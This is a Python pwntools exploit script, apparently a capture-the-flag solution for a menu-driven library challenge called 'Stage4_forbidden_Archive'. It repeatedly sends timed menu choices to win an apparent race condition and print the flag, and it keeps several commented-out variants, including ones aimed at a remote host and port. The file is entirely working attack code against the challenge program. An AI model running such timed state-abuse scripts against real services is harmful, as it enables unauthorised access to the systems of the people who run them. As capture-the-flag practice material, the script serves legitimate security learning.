from pwn import *
from time import sleep

#p = remote('128.134.83.160', 41404)
p = process('./Stage4_forbidden_Archive.o')
p.recvuntil(b'User name: ')
p.sendline(b'aaaa')
p.recvuntil(b'Book title to borrow: ')
p.sendline(b'bbbb')

for i in range(7):
    p.sendlineafter(b'Choice: ', b'2')
    sleep(0.5)
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Choice: ', b'3')
    sleep(0.5)
p.sendlineafter(b'Choice: ', b'2')
sleep(0.5)
p.sendlineafter(b'Choice: ', b'3')
sleep(0.5)
p.sendlineafter(b'Choice: ', b'1')
sleep(0.5)

for i in range(1000):
    try:
        if i ==0:
            p.sendlineafter(b'Choice: ', b'2')
        else:
            p.sendline(b'2')
        sleep(i*0.01)
        p.sendlineafter(b'Choice: ', b'3')
        sleep(0.5)
        p.sendlineafter(b'Choice: ', b'4')
        out = p.recv(timeout=0.5)
        if b'flag' in out or b'FLAG' in out:
            print('[+] FLAG:', out)
            break
        else:
            print(i, "not yet\n")
        sleep(0.5)
    except EOFError:
        print(f"error")
        break
# try:
#     p.sendlineafter(b'Choice: ', b'1')
#     sleep(3)
#     out = p.recvuntil(b'Choice: ', timeout=2)
#     print(out.decode())
# except EOFError:
#     print('[!] 서버가 연결을 종료했습니다.')
#     print(p.recvall(timeout=2).decode(errors='ignore'))
p.interactive()
#
# for i in range(3000):
#     p.sendlineafter(b'Choice: ', b'3 3')
#     # 바로 빌리기 시도
#     p.sendlineafter(b'Choice: ', b'4')
#     out = p.recv(timeout=0.5)
#
#     if b'flag' in out or b'FLAG' in out:
#         print('[+] FLAG:', out)
#         break
# from pwn import *
# from time import sleep
#
# p = remote('128.134.83.160', 41404)
#
# # 사용자 등록 단계 (이름, 책 제목 입력)
# p.recvuntil(b'User name: ')
# p.sendline(b'aaaa')
# p.recvuntil(b'Book title to borrow: ')
# p.sendline(b'bbbb')
#
# for i in range(4):
#     p.sendlineafter(b'Choice: ', b'2')
#     sleep(1)
#     p.sendlineafter(b'Choice: ', b'3 3')
#     sleep(1)
# sleep(1)
# for i in range(1000):
#     p.sendlineafter(b'Choice: ', b'1')
#     out = p.recv(timeout=1)
#     if b'Current Waiting' in out:
#         break
# print(out)


# for i in range(100000):
#     p.sendlineafter(b'Choice: ', b'2')
#     p.sendlineafter(b'Choice: ', b'3')
#     p.sendlineafter(b'Choice: ', b'4')
#     out = p.recv(timeout=0.4)
#     if b'flag' in out or b'FLAG' in out:
#         print('FLAG:', out)
#         break

